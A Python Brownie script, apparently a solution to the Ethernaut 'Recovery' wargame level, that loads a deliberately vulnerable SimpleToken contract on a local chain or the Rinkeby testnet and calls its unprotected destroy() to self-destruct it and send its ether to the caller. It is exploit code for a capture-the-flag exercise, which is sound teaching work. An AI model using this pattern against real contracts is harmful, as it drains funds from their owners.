from brownie import Contract, Recovery, SimpleToken, network, config
from ...helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        recovery = Recovery.deploy({"from": get_account(index=1)})

        recovery.generateToken("mockCoin", 100, {"from": get_account(index=1)}).wait(1)

        simple_token = Contract.from_abi(
            SimpleToken._name,
            recovery.newestSimpleToken(),
            SimpleToken.abi,
        )

        get_account(index=1).transfer(simple_token, "0.5 ether").wait(1)

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                config["networks"][network.show_active()]["infura"]
            )
        )

        recovery = Contract.from_abi(
            Recovery._name,
            config["networks"][network.show_active()]["recovery"],
            Recovery.abi,
        )

        simple_token = Contract.from_abi(
            SimpleToken._name,
            "0x2FEbEea10F75475538baB24e7D8B4c3477dc8117",  # https://rinkeby.etherscan.io/address/0x2febeea10f75475538bab24e7d8b4c3477dc8117
            SimpleToken.abi,
        )

    print(f"Token name is {simple_token.name()}")

    simple_token.destroy(account, {"from": account}).wait(1)

    print(f"Account balance is {Web3.fromWei(account.balance(), 'ether')}")


def main():
    attack()
